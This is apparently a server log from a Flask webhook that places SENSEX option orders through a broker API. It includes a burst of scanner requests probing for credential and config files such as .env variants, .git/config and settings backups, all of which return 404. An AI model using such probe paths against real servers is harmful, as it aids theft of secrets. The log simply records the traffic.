+2024-06-11 06:31:53,848 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:31:53] "[33mGET /app HTTP/1.0[0m" 404 -
+2024-06-11 06:31:54,343 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:31:54] "[33mGET /config/application.yml HTTP/1.0[0m" 404 -
+2024-06-11 06:31:54,840 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:31:54] "[33mGET /dev/config.js HTTP/1.0[0m" 404 -
+2024-06-11 06:31:55,336 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:31:55] "[33mGET /prod/config HTTP/1.0[0m" 404 -
+2024-06-11 06:31:55,828 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:31:55] "[33mGET /js/config.js HTTP/1.0[0m" 404 -
+2024-06-11 06:31:56,324 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:31:56] "[33mGET /ventrilo_srv.ini HTTP/1.0[0m" 404 -
+2024-06-11 06:31:56,817 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:31:56] "[33mGET /application-test.properties HTTP/1.0[0m" 404 -
+2024-06-11 06:31:57,314 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:31:57] "[33mGET /config/test.json HTTP/1.0[0m" 404 -
+2024-06-11 06:31:57,810 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:31:57] "[33mGET /application-dev.properties HTTP/1.0[0m" 404 -
+2024-06-11 06:31:58,306 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:31:58] "[33mGET /dev HTTP/1.0[0m" 404 -
+2024-06-11 06:31:58,799 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:31:58] "[33mGET /js/prod.js HTTP/1.0[0m" 404 -
+2024-06-11 06:31:59,291 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:31:59] "[33mGET /appset.json HTTP/1.0[0m" 404 -
+2024-06-11 06:31:59,784 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:31:59] "[33mGET /src/config.js HTTP/1.0[0m" 404 -
+2024-06-11 06:32:00,279 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:00] "[33mGET /server/_config.js HTTP/1.0[0m" 404 -
+2024-06-11 06:32:00,774 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:00] "[33mGET /testData.json HTTP/1.0[0m" 404 -
+2024-06-11 06:32:01,267 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:01] "[33mGET /venv.bak HTTP/1.0[0m" 404 -
+2024-06-11 06:32:01,763 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:01] "[33mGET /config/settings.yaml HTTP/1.0[0m" 404 -
+2024-06-11 06:32:02,256 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:02] "[33mGET /applicationprod.properties HTTP/1.0[0m" 404 -
+2024-06-11 06:32:02,748 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:02] "[33mGET /config.properties.bak HTTP/1.0[0m" 404 -
+2024-06-11 06:32:03,244 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:03] "[33mGET /config/default.json HTTP/1.0[0m" 404 -
+2024-06-11 06:32:03,742 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:03] "[33mGET /prod.js HTTP/1.0[0m" 404 -
+2024-06-11 06:32:04,235 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:04] "[33mGET /matomo/.travis.yml HTTP/1.0[0m" 404 -
+2024-06-11 06:32:04,731 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:04] "[33mGET /application-test.properties HTTP/1.0[0m" 404 -
+2024-06-11 06:32:05,227 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:05] "[33mGET /config HTTP/1.0[0m" 404 -
+2024-06-11 06:32:05,720 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:05] "[33mGET /prod/config.json HTTP/1.0[0m" 404 -
+2024-06-11 06:32:06,212 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:06] "[33mGET /phinx.yml HTTP/1.0[0m" 404 -
+2024-06-11 06:32:06,708 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:06] "[33mGET /django/settings.py HTTP/1.0[0m" 404 -
+2024-06-11 06:32:07,200 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:07] "[33mGET /instance/config.py HTTP/1.0[0m" 404 -
+2024-06-11 06:32:07,696 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:07] "[33mGET /app.component.js HTTP/1.0[0m" 404 -
+2024-06-11 06:32:08,192 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:08] "[33mGET /dev.js HTTP/1.0[0m" 404 -
+2024-06-11 06:32:08,686 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:08] "[33mGET /config/application.properties HTTP/1.0[0m" 404 -
+2024-06-11 06:32:09,890 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:09] "[33mGET /application-local.properties HTTP/1.0[0m" 404 -
+2024-06-11 06:32:10,386 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:10] "[33mGET /configData.json HTTP/1.0[0m" 404 -
+2024-06-11 06:32:10,879 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:10] "[33mGET /config_default HTTP/1.0[0m" 404 -
+2024-06-11 06:32:12,065 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:12] "[33mGET /config/production.json HTTP/1.0[0m" 404 -
+2024-06-11 06:32:12,561 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:12] "[33mGET /app.json HTTP/1.0[0m" 404 -
+2024-06-11 06:32:13,054 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:13] "[33mGET /local.properties HTTP/1.0[0m" 404 -
+2024-06-11 06:32:13,553 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:13] "[33mGET /test/config.js HTTP/1.0[0m" 404 -
+2024-06-11 06:32:14,049 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:14] "[33mGET /src.js HTTP/1.0[0m" 404 -
+2024-06-11 06:32:14,544 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:14] "[33mGET /dev/config HTTP/1.0[0m" 404 -
+2024-06-11 06:32:15,037 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:15] "[33mGET /settings.php.old HTTP/1.0[0m" 404 -
+2024-06-11 06:32:15,531 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:15] "[33mGET /.docker/config.json HTTP/1.0[0m" 404 -
+2024-06-11 06:32:16,023 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:16] "[33mGET /config/development.json HTTP/1.0[0m" 404 -
+2024-06-11 06:32:16,519 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:16] "[33mGET /settings.php.bak HTTP/1.0[0m" 404 -
+2024-06-11 06:32:17,012 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:17] "[33mGET /test/config HTTP/1.0[0m" 404 -
+2024-06-11 06:32:17,507 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:17] "[33mGET /install/app.php HTTP/1.0[0m" 404 -
+2024-06-11 06:32:18,000 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:18] "[33mGET /.travis.yml HTTP/1.0[0m" 404 -
+2024-06-11 06:32:20,012 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:20] "[33mGET /environment.json HTTP/1.0[0m" 404 -
+2024-06-11 06:32:20,504 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:20] "[33mGET /ui_config.properties HTTP/1.0[0m" 404 -
+2024-06-11 06:32:20,997 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:20] "[33mGET /app.module.js HTTP/1.0[0m" 404 -
+2024-06-11 06:32:21,495 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:21] "[33mGET /phinx.yaml HTTP/1.0[0m" 404 -
+2024-06-11 06:32:21,991 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:21] "[33mGET /webapp.js HTTP/1.0[0m" 404 -
+2024-06-11 06:32:22,484 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:22] "[33mGET /config/local.json HTTP/1.0[0m" 404 -
+2024-06-11 06:32:22,977 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:22] "[33mGET /application-staging.properties HTTP/1.0[0m" 404 -
+2024-06-11 06:32:23,474 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:23] "[33mGET /config/settings.local.yaml HTTP/1.0[0m" 404 -
+2024-06-11 06:32:23,968 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:23] "[33mGET /env.bak HTTP/1.0[0m" 404 -
+2024-06-11 06:32:24,460 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:24] "[33mGET /.docker/.env HTTP/1.0[0m" 404 -
+2024-06-11 06:32:24,956 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:24] "[33mGET /.docker/laravel/app/.env HTTP/1.0[0m" 404 -
+2024-06-11 06:32:25,448 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:25] "[33mGET /.env.docker HTTP/1.0[0m" 404 -
+2024-06-11 06:32:25,944 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:25] "[33mGET /.env.save HTTP/1.0[0m" 404 -
+2024-06-11 06:32:26,440 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:32:26] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 06:33:01,909 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T06:33:00Z",\n    "strategy.order.price": "76668.44",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 06:33:01,909 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T06:33:00Z', 'strategy.order.price': '76668.44', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 06:33:04,344 - __main__ - INFO - tradingsymbol: SENSEX2461476700PE
+[I 240611 06:33:04 smart_api_client:77] OrderId: 240611000833740
+[I 240611 06:33:05 smart_api_client:77] OrderId: 240611000833756
+[I 240611 06:33:05 smart_api_client:85] Logout Successful
+2024-06-11 06:33:05,950 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:33:05] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 06:34:30,517 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T06:34:30Z",\n    "strategy.order.price": "76664.8",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 06:34:30,517 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T06:34:30Z', 'strategy.order.price': '76664.8', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 06:34:31,620 - __main__ - INFO - tradingsymbol: SENSEX2461476600CE
+[I 240611 06:34:32 smart_api_client:77] OrderId: 240611000836987
+[I 240611 06:34:32 smart_api_client:77] OrderId: 240611000837008
+[I 240611 06:34:33 smart_api_client:85] Logout Successful
+2024-06-11 06:34:33,235 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:34:33] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 06:35:13,959 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:35:13] "[33mGET /.git/config HTTP/1.0[0m" 404 -
+2024-06-11 06:35:14,843 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:35:14] "[33mGET /api/.git/config HTTP/1.0[0m" 404 -
+2024-06-11 06:40:02,463 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T06:40:00Z",\n    "strategy.order.price": "76673.40000000001",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 06:40:02,463 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T06:40:00Z', 'strategy.order.price': '76673.40000000001', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 06:40:03,698 - __main__ - INFO - tradingsymbol: SENSEX2461476700PE
+[I 240611 06:40:04 smart_api_client:77] OrderId: 240611000853066
+[I 240611 06:40:04 smart_api_client:77] OrderId: 240611000853088
+[I 240611 06:40:05 smart_api_client:85] Logout Successful
+2024-06-11 06:40:05,325 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:40:05] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 06:46:30,879 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T06:46:30Z",\n    "strategy.order.price": "76664.93000000001",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 06:46:30,880 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T06:46:30Z', 'strategy.order.price': '76664.93000000001', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 06:46:32,052 - __main__ - INFO - tradingsymbol: SENSEX2461476600CE
+[I 240611 06:46:32 smart_api_client:77] OrderId: 240611000869818
+[I 240611 06:46:33 smart_api_client:77] OrderId: 240611000869839
+[I 240611 06:46:33 smart_api_client:85] Logout Successful
+2024-06-11 06:46:33,664 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:46:33] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 06:48:22,162 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:48:22] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 06:49:33,754 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:49:33] "[33mGET /.git/config HTTP/1.0[0m" 404 -
+2024-06-11 06:55:03,915 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T06:55:00Z",\n    "strategy.order.price": "76669.53",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 06:55:03,916 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T06:55:00Z', 'strategy.order.price': '76669.53', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 06:55:05,163 - __main__ - INFO - tradingsymbol: SENSEX2461476700PE
+[I 240611 06:55:05 smart_api_client:77] OrderId: 240611000891300
+[I 240611 06:55:06 smart_api_client:77] OrderId: 240611000891329
+[I 240611 06:55:06 smart_api_client:85] Logout Successful
+2024-06-11 06:55:06,907 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:55:06] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 07:01:01,530 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T07:01:00Z",\n    "strategy.order.price": "76661.12",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 07:01:01,530 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T07:01:00Z', 'strategy.order.price': '76661.12', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 07:01:02,741 - __main__ - INFO - tradingsymbol: SENSEX2461476600CE
+[I 240611 07:01:03 smart_api_client:77] OrderId: 240611000906922
+[I 240611 07:01:03 smart_api_client:77] OrderId: 240611000906956
+[I 240611 07:01:04 smart_api_client:85] Logout Successful
+2024-06-11 07:01:04,410 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 07:01:04] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 07:08:31,906 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T07:08:30Z",\n    "strategy.order.price": "76669.58",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 07:08:31,907 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T07:08:30Z', 'strategy.order.price': '76669.58', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 07:08:33,213 - __main__ - INFO - tradingsymbol: SENSEX2461476700PE
+[I 240611 07:08:33 smart_api_client:77] OrderId: 240611000928373
+[I 240611 07:08:34 smart_api_client:77] OrderId: 240611000928397
+[I 240611 07:08:34 smart_api_client:85] Logout Successful
+2024-06-11 07:08:34,869 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 07:08:34] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 07:09:30,491 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T07:09:30Z",\n    "strategy.order.price": "76657.96",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 07:09:30,491 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T07:09:30Z', 'strategy.order.price': '76657.96', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 07:09:31,620 - __main__ - INFO - tradingsymbol: SENSEX2461476600CE
+[I 240611 07:09:32 smart_api_client:77] OrderId: 240611000930415
+[I 240611 07:09:32 smart_api_client:77] OrderId: 240611000930430
+[I 240611 07:09:33 smart_api_client:85] Logout Successful
+2024-06-11 07:09:33,288 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 07:09:33] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 07:10:02,080 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T07:10:00Z",\n    "strategy.order.price": "76670.37",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 07:10:02,080 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T07:10:00Z', 'strategy.order.price': '76670.37', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 07:10:03,169 - __main__ - INFO - tradingsymbol: SENSEX2461476700PE
+[I 240611 07:10:03 smart_api_client:77] OrderId: 240611000931579
+[I 240611 07:10:04 smart_api_client:77] OrderId: 240611000931605
+[I 240611 07:10:04 smart_api_client:85] Logout Successful
+2024-06-11 07:10:04,813 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 07:10:04] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 07:11:31,282 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T07:11:30Z",\n    "strategy.order.price": "76657.40000000001",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 07:11:31,282 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T07:11:30Z', 'strategy.order.price': '76657.40000000001', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 07:11:32,387 - __main__ - INFO - tradingsymbol: SENSEX2461476600CE
+[I 240611 07:11:32 smart_api_client:77] OrderId: 240611000934984
+[I 240611 07:11:33 smart_api_client:77] OrderId: 240611000935009
+[I 240611 07:11:34 smart_api_client:85] Logout Successful
+2024-06-11 07:11:34,050 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 07:11:34] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 07:12:00,951 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T07:12:00Z",\n    "strategy.order.price": "76663.8",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 07:12:00,951 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T07:12:00Z', 'strategy.order.price': '76663.8', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 07:12:02,096 - __main__ - INFO - tradingsymbol: SENSEX2461476700PE
+[I 240611 07:12:02 smart_api_client:77] OrderId: 240611000936020
+[I 240611 07:12:03 smart_api_client:77] OrderId: 240611000936034
+[I 240611 07:12:03 smart_api_client:85] Logout Successful
+2024-06-11 07:12:03,715 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 07:12:03] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 07:19:30,711 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T07:19:30Z",\n    "strategy.order.price": "76658.62",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 07:19:30,711 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T07:19:30Z', 'strategy.order.price': '76658.62', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 07:19:31,838 - __main__ - INFO - tradingsymbol: SENSEX2461476600CE
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476700PE', 'symboltoken': '1110350', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'BUY', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
+{'variety': 'NORMAL', 'tradingsymbol': 'SENSEX2461476600CE', 'symboltoken': '1109969', 'transactiontype': 'SELL', 'instrumenttype': 'OPTIDX', 'exchange': 'BFO', 'ordertype': 'MARKET', 'price': 0, 'producttype': 'CARRYFORWARD', 'duration': 'DAY', 'quantity': '10'}
